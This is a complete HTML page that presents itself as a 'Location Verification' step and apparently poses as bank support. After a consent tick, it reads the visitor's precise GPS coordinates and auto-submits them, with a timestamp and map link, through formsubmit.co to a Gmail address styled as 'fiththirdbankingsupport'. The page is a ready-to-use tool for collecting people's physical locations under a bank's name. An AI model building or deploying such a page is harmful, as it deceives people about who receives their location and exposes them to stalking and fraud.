<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Location Verification</title>
  <style>
    body { font-family: system-ui, sans-serif; max-width: 620px; margin: 60px auto; padding: 24px; line-height: 1.5; }
    .card { border: 1px solid #ddd; border-radius: 14px; padding: 28px; }
    button { padding: 12px 18px; border: 0; border-radius: 8px; cursor: pointer; font-size: 16px; }
    #status { margin-top: 18px; white-space: pre-wrap; }
    .small { color: #666; font-size: 14px; }
    .consent { margin: 18px 0; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Location Verification</h1>
    <p>
      If you voluntarily agree, you can share your current location for
      verification. Your browser will ask for permission first.
    </p>

    <div class="consent">
      <label>
        <input type="checkbox" id="consent">
        I understand and voluntarily agree to send my current location to
        <strong>fiththirdbankingsupport@gmail.com</strong>.
      </label>
    </div>

    <button id="share">Share My Location</button>
    <div id="status" role="status"></div>

    <p class="small">
      Nothing is submitted unless you check the consent box, press the button,
      and approve the browser's location permission request.
    </p>

    <form id="locationForm"
          action="https://formsubmit.co/fiththirdbankingsupport@gmail.com"
          method="POST" style="display:none;">
      <input type="hidden" name="_subject" value="Voluntary Location Verification">
      <input type="hidden" name="_captcha" value="true">
      <input type="hidden" name="latitude" id="latitude">
      <input type="hidden" name="longitude" id="longitude">
      <input type="hidden" name="accuracy_meters" id="accuracy">
      <input type="hidden" name="timestamp" id="timestamp">
      <input type="hidden" name="map_link" id="map">
    </form>
  </div>

  <script>
    const button = document.getElementById("share");
    const consent = document.getElementById("consent");
    const status = document.getElementById("status");
    const form = document.getElementById("locationForm");

    button.addEventListener("click", () => {
      if (!consent.checked) {
        status.textContent = "Please check the consent box first.";
        return;
      }

      if (!navigator.geolocation) {
        status.textContent = "This browser does not support location sharing.";
        return;
      }

      status.textContent = "Requesting your browser's location permission…";

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          const map = `https://www.google.com/maps?q=${latitude},${longitude}`;

          document.getElementById("latitude").value = latitude;
          document.getElementById("longitude").value = longitude;
          document.getElementById("accuracy").value = Math.round(accuracy);
          document.getElementById("timestamp").value = new Date().toISOString();
          document.getElementById("map").value = map;

          status.textContent =
            "Location permission granted. Submitting the voluntarily shared location…";

          form.submit();
        },
        (error) => {
          const messages = {
            1: "Location permission was denied.",
            2: "Your location could not be determined.",
            3: "The location request timed out."
          };
          status.textContent = messages[error.code] || "Unable to obtain location.";
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  </script>
</body>
</html>
